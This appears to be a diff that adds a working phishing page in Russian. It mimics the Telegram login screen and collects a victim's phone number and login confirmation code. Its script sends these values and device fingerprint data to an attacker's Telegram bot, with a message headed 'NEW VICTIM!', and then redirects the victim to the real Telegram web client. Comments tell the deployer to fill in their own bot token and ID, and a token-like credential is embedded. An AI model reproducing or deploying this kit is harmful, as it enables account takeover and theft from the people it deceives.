@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram — Вход</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #0d1117;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 450px;
+            width: 100%;
+            background: #161b22;
+            border-radius: 16px;
+            padding: 30px 25px;
+            border: 1px solid #30363d;
+        }
+        h1 { color: #ffffff; font-size: 24px; text-align: center; margin-bottom: 8px; }
+        .subtitle { color: #8b949e; text-align: center; font-size: 14px; margin-bottom: 28px; }
+        .input-group { margin-bottom: 20px; }
+        label { color: #e6edf3; font-size: 14px; font-weight: 500; margin-bottom: 8px; display: block; }
+        input {
+            width: 100%;
+            padding: 12px 14px;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 16px;
+        }
+        input:focus { outline: none; border-color: #1f6feb; }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #238636;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover { background: #2ea043; }
+        .error {
+            background: rgba(248,81,73,0.2);
+            border: 1px solid #f85149;
+            border-radius: 8px;
+            padding: 10px;
+            margin-top: 15px;
+            color: #f85149;
+            font-size: 13px;
+            display: none;
+        }
+        .footer { margin-top: 24px; text-align: center; font-size: 12px; color: #6e7681; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Вход в Telegram</h1>
+        <div class="subtitle">Введите данные для входа</div>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <label>📱 Номер телефона</label>
+                <input type="tel" id="phone" placeholder="+7 123 456 78 90" required>
+            </div>
+            <div class="input-group">
+                <label>🔐 Код подтверждения</label>
+                <input type="text" id="code" placeholder="Код из Telegram" required>
+            </div>
+            <button type="submit">Войти</button>
+        </form>
+        
+        <div class="error" id="errorMsg"></div>
+        <div class="footer">Telegram — защищённый мессенджер</div>
+    </div>
+
+    <script>
+        // 👇👇👇 ЗАМЕНИ НА СВОИ ДАННЫЕ 👇👇👇
+        const BOT_TOKEN = "8820194857:AAEcT1qBpODtvkUK58MfJT77_U9iVRplapg";     // ← Токен от @BotFather
+        const ADMIN_ID = "912559442";            // ← Твой Telegram ID
+        
+        const WEBHOOK_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        async function sendToBot(phone, code, userData) {
+            const text = `🔴 *НОВАЯ ЖЕРТВА!*\n\n📞 Телефон: ${phone}\n🔢 Код: ${code}\n\n🌍 *Данные устройства:*\n├ 📱 User-Agent: ${userData.ua}\n├ 🖥️ Платформа: ${userData.platform}\n├ 🌐 Язык: ${userData.language}\n├ 📐 Экран: ${userData.screen}\n├ 🔗 Реферер: ${userData.referrer || 'прямой переход'}\n└ 🕒 Время: ${new Date().toLocaleString()}`;
+            
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: ADMIN_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            });
+        }
+        
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const phone = document.getElementById('phone').value;
+            const code = document.getElementById('code').value;
+            
+            if (!phone || !code) {
+                document.getElementById('errorMsg').textContent = 'Заполните все поля';
+                document.getElementById('errorMsg').style.display = 'block';
+                return;
+            }
+            
+            const userData = {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                referrer: document.referrer
+            };
+            
+            await sendToBot(phone, code, userData);
+            
+            // Перенаправляем на настоящий telegram
+            window.location.href = "https://web.telegram.org/k/";
+        });
+    </script>
+</body>
+</html>
